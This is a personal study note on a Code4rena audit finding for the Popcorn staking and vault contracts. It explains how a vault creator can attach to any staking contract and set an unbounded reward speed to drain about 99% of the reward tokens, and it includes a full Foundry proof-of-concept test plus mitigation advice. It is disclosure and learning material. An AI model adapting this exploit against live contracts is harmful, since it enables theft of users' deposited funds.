# 2023-01-popcorn
---
- Category: #yield #staking_pool 
- Note Create 2025-01-15
- Platform: code4rena
- Report Url: [2023-01-popcorn](https://code4rena.com/reports/2023-01-popcorn)
---
# High Risk Findings (xx)

---
## [H-09] Attacker can steal 99% of total balance from any reward token in any Staking contract
----
- **Tags**:  #Deposit_or_Reward_tokens #business_logic #access_control 
- Number of finders: 1
- Difficulty: Hard
---
### Impact

Attacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.

So an attacker gets access to `changeRewardSpeed`, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker's created vault, he can now successfully `changeRewardSpeed`. Now with `changeRewardSpeed`, attacker can set the `rewardSpeed` to any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)
### Proof of Concept

This attack is made possible by the following issues:

1. Any user can deploy a Vault that uses any existing Staking contract - [vault/VaultController.sol#L106-L108](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108)
```solidity
  function deployVault(
    VaultInitParams memory vaultData,
    DeploymentArgs memory adapterData,
    DeploymentArgs memory strategyData,
    address staking,
    bytes memory rewardsData,
    VaultMetadata memory metadata,
    uint256 initialDeposit
  ) external canCreate returns (address vault) {
  ... ...    
    vault = _deployVault(vaultData, _deploymentController);


    if (staking == address(0)) staking = _deployStaking(IERC20(address(vault)), _deploymentController);
```
2. As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can call `changeStakingRewardSpeeds` to modify the rewardSpeeds of any reward tokens in the target Staking contract - [vault/VaultController.sol#L495-L501](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501)
```solidity
  function changeStakingRewardsSpeeds(
    address[] calldata vaults,
    IERC20[] calldata rewardTokens,
    uint160[] calldata rewardsSpeeds
  ) external {
  ... ...
      staking = _verifyCreator(vaults[i]).staking;


      (bool success, bytes memory returnData) = adminProxy.execute(
        staking,
        abi.encodeWithSelector(IMultiRewardStaking.changeRewardSpeed.selector, rewardTokens[i], rewardsSpeeds[i])
      );
      if (!success) revert UnderlyingError(returnData);
```
    
3. There are no checks for limits on the `rewardsPerSecond` value in `changeRewardSpeed` so attacker can set any amount they want - [utils/MultiRewardStaking.sol#L299-L314](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314)
```solidity
  function changeRewardSpeed(IERC20 rewardToken, uint160 rewardsPerSecond) external onlyOwner {
    RewardInfo memory rewards = rewardInfos[rewardToken];

    if (rewardsPerSecond == 0) revert ZeroAmount();
    if (rewards.lastUpdatedTimestamp == 0) revert RewardTokenDoesntExist(rewardToken);
    if (rewards.rewardsPerSecond == 0) revert RewardsAreDynamic(rewardToken);


    _accrueRewards(rewardToken, _accrueStatic(rewards));


    uint256 remainder = rewardToken.balanceOf(address(this));


    uint32 prevEndTime = rewards.rewardsEndTimestamp;
    uint32 rewardsEndTimestamp = _calcRewardsEnd(
      prevEndTime > block.timestamp ? prevEndTime : block.timestamp.safeCastTo32(),
      rewardsPerSecond,
      remainder
    );
    rewardInfos[rewardToken].rewardsPerSecond = rewardsPerSecond;
    rewardInfos[rewardToken].rewardsEndTimestamp = rewardsEndTimestamp;
}
```
4. `changeRewardSpeed` also uses `_calcRewardsEnd` to get the new `rewardsEndTimestamp` but that calculation is faulty and the new timestamp is always longer than it's supposed to be leading to people being able to claim more rewards than they should get - [utils/MultiRewardStaking.sol#L351-L360](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360)
```solidity
  function _calcRewardsEnd(
    uint32 rewardsEndTimestamp,
    uint160 rewardsPerSecond,
    uint256 amount
  ) internal returns (uint32) {
    if (rewardsEndTimestamp > block.timestamp)
      amount += uint256(rewardsPerSecond) * (rewardsEndTimestamp - block.timestamp);


    return (block.timestamp + (amount / uint256(rewardsPerSecond))).safeCastTo32();
  }
```
Below is the PoC using a Foundry test: [/Users/saneryee/3.3_AuditReportsPoC/2023-01-popcorn/test/vault/VaultController.t.sol](/Users/saneryee/3.3_AuditReportsPoC/2023-01-popcorn/test/vault/VaultController.t.sol)
```solidity
  function test__steal_rewards_from_any_staking_contract() public {
    addTemplate("Adapter", templateId, adapterImpl, true, true);
    addTemplate("Strategy", "MockStrategy", strategyImpl, false, true);
    addTemplate("Vault", "V1", vaultImpl, true, true);

    // 1. deploy regular legit vault owned by this
    address vault = deployVault();
    address staking = vaultRegistry.getVault(vault).staking;

    rewardToken.mint(staking, 1_000_000 ether);

    vm.startPrank(bob);
    asset.mint(bob, 10000 ether);
    asset.approve(vault, 10000 ether);
    IVault(vault).deposit(10000 ether, bob);
    IVault(vault).approve(staking, 10000 ether);
    IMultiRewardStaking(staking).deposit(9900 ether, bob);
    vm.stopPrank();

    vm.startPrank(alice);
    // 2. deploy attacker-owned vault using the same Staking contract as legit vault
    // alice is the attacker
    address attackerVault = controller.deployVault(
      VaultInitParams({
        asset: iAsset,
        adapter: IERC4626(address(0)),
        fees: VaultFees({
          deposit: 100,
          withdrawal: 200,
          management: 300,
          performance: 400
        }),
        feeRecipient: feeRecipient,
        owner: address(this)
      }),
      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),
      DeploymentArgs({ id: 0, data: "" }),
      staking,
      "",
      VaultMetadata({
        vault: address(0),
        staking: staking,
        creator: alice,
        metadataCID: metadataCid,
        swapTokenAddresses: swapTokenAddresses,
        swapAddress: address(0x5555),
        exchange: uint256(1)
      }),
      0
    );

    asset.mint(alice, 10 ether);
    asset.approve(vault, 10 ether);
    IVault(vault).deposit(10 ether, alice);
    IVault(vault).approve(staking, 10 ether);
    IMultiRewardStaking(staking).deposit(1 ether, alice);

    address[] memory targets = new address[](1);
    targets[0] = attackerVault;
    IERC20[] memory rewardTokens = new IERC20[](1);
    rewardTokens[0] = iRewardToken;
    uint160[] memory rewardsSpeeds = new uint160[](1);
    rewardsSpeeds[0] = 990_099_990 ether;
    controller.changeStakingRewardsSpeeds(targets, rewardTokens, rewardsSpeeds);

    assertGt(rewardToken.balanceOf(staking), 1_000_000 ether);

    vm.warp(block.timestamp + 12);
    MultiRewardStaking(staking).claimRewards(alice, rewardTokens);

    assertGt(rewardToken.balanceOf(alice), 999_999 ether);
    assertLt(1 ether, rewardToken.balanceOf(staking));
    vm.stopPrank();
  }
```

The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)  
Note that the attacker can tweak the amount they stake in the contract, the reward speed they'll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.

The test can be run with:  
`forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract`

*run test `/Users/saneryee/3.3_AuditReportsPoC/2023-01-popcorn/test/vault/VaultController.t.sol`*
### Recommended Mitigation

1. Don't allow any Vault creator to use and modify just ANY Staking contract - [vault/VaultController.sol#L106-L108](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108)
2. Add checks to limit how high `rewardsPerSecond` can be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. - [utils/MultiRewardStaking.sol#L299-L314](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314)    
3. Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time - [utils/MultiRewardStaking.sol#L351-L360](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360)

### Discussion

### Notes

#### Notes 
1. anyone can create a new Vault - there's no verification
2. The creator of any connected Vault can modify reward speeds, even for Staking contracts they don't own.
3. no limits on how high the reward speed can be set
4. Calculation error in how the contract determines when rewards should end.
#### Impressions
I think the core of this finding is that we should check whether crucial parameters have limits(such as rate, speed, ratio,)

### Tools
### Refine

- [[1-Business_Logic]]
- [[14-Accrss_Control]]

---

---

# Medium Risk Findings (xx)

---

{{Copy from Medium Risk Finding Template.md}}

---

## Audit Summary Notes
- {{summary_notes}}

## Tags
- Category: {{tags_category}}
- Priority:{{tags_priority}}